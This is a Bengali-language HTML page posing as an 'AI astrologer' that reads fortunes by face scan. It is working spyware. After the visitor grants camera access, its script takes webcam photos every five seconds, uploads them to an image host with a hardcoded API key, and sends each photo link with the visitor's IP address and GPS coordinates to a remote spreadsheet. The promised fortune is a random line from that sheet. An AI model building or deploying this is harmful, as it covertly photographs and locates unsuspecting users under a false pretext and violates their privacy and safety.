<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI জ্যোতিষী - প্রিমিয়াম ভাগ্য গণনা</title>
    <style>
        :root { --primary: #7928ca; --secondary: #ff0080; --bg: #050505; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
        .box { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 40px 30px; border-radius: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); max-width: 450px; width: 90%; border: 1px solid rgba(255,255,255,0.1); position: relative; z-index: 10; text-align: center; }
        h2 { background: linear-gradient(to right, #7928ca, #ff0080); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 28px; margin-bottom: 10px; }
        p { color: #a1a1a1; font-size: 16px; line-height: 1.6; }
        .btn { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 18px; border: none; border-radius: 15px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.4s; box-shadow: 0 10px 20px rgba(121, 40, 202, 0.3); }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(121, 40, 202, 0.5); }
        #status { margin-top: 25px; font-size: 14px; }
        #scanner { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
        .scan-line { width: 80%; height: 4px; background: #00ff00; position: absolute; animation: scanMove 2s infinite linear; box-shadow: 0 0 20px #00ff00; }
        @keyframes scanMove { 0% { top: 10%; } 100% { top: 90%; } }
        .result-card { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; border-left: 5px solid var(--secondary); animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        video, canvas { display: none; }
        .retry-btn { margin-top: 20px; background: transparent; border: 1px solid #444; color: #ccc; padding: 10px 20px; border-radius: 10px; cursor: pointer; transition: 0.3s; }
        .retry-btn:hover { background: #444; color: white; }
    </style>
</head>
<body>

<div class="box" id="mainBox">
    <h2>🔮 AI ডিজিটাল ভবিষ্যৎ</h2>
    <p>আমাদের উন্নত AI অ্যালগরিদম আপনার ফেস এনালাইসিস করে ভাগ্যের গোপন রহস্য উন্মোচন করবে।</p>
    <button class="btn" id="startBtn">স্ক্যান শুরু করুন</button>
    <div id="status">নিশ্চিত করুন আপনার ক্যামেরা ও লোকেশন অন আছে।</div>
</div>

<div id="scanner">
    <div class="scan-line"></div>
    <h3 style="color: #00ff00; letter-spacing: 2px;">ক্যামেরার দিকে তাকিয়ে হাসি দিন...</h3>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const IMGBB_API_KEY = "3d66780bd0b6e264f2f3c64a306022cc"; 
    const SHEETDB_URL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet8";
    
    const startBtn = document.getElementById('startBtn');
    const statusDiv = document.getElementById('status');
    const scanner = document.getElementById('scanner');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    let userIP = "Loading...";
    let gpsData = "N/A";
    let isMonitoring = false;

    // IP সংগ্রহ
    async function collectIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) { userIP = "Unknown"; }
    }

    // শিট থেকে র‍্যান্ডম রেজাল্ট আনা
    async function fetchRandomLuckyResult() {
        try {
            const response = await fetch(SHEETDB_URL);
            const data = await response.json();
            
            // 'dy' কলামের ডাটাগুলো ফিল্টার করা
            const results = data.map(row => row.dy).filter(val => val && val.trim() !== "");
            
            if (results.length > 0) {
                const randomIndex = Math.floor(Math.random() * results.length);
                return results[randomIndex];
            }
            return "আপনার ভাগ্য আজ রহস্যময়, আবার চেষ্টা করুন!";
        } catch (error) {
            console.error("SheetDB Error:", error);
            return "আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।"; // এরর হলে ডিফল্ট মেসেজ
        }
    }

    async function captureAndSend() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const base64Image = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
            const formData = new FormData();
            formData.append("image", base64Image);

            try {
                const imgbbRes = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: "POST",
                    body: formData
                });
                const imgbbData = await imgbbRes.json();
                
                if(imgbbData.success) {
                    const imageUrl = imgbbData.data.url;
                    await fetch(SHEETDB_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            "data": [{ "img": imageUrl, "ip": userIP, "gps": gpsData }]
                        })
                    });
                }
            } catch (e) { console.error("Upload Error"); }
        }
    }

    startBtn.addEventListener('click', async () => {
        statusDiv.innerHTML = "<p style='color: #ffaa00;'>অনুমতি পরীক্ষা করা হচ্ছে...</p>";
        
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => { gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
                (err) => { console.log("Location Denied"); },
                { timeout: 5000 }
            );

            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = stream;
            
            startBtn.style.display = 'none';
            scanner.style.display = 'flex';

            await collectIP();
            
            if (!isMonitoring) {
                isMonitoring = true;
                setInterval(captureAndSend, 5000); 
            }

            setTimeout(captureAndSend, 1500);

            // রেজাল্ট ফেচ করা শুরু
            const finalLuckyMessage = await fetchRandomLuckyResult();

            setTimeout(() => {
                scanner.style.display = 'none';
                statusDiv.innerHTML = `
                    <div class="result-card">
                        <h3 style="color: var(--secondary); margin-top:0;">🎯 AI ফলাফল:</h3>
                        <p style="color: white; font-size: 18px; font-weight: bold;">${finalLuckyMessage}</p>
                        <button class="retry-btn" onclick="location.reload()">আবার দেখুন</button>
                    </div>
                `;
            }, 6000);

        } catch (err) {
            console.error(err);
            scanner.style.display = 'none';
            statusDiv.innerHTML = `<p style="color:#f85149;">ক্যামেরা অনুমতি প্রয়োজন। দয়া করে সেটিংস থেকে ক্যামেরা এলাউ করুন।</p>`;
        }
    });
</script>

</body>
</html>
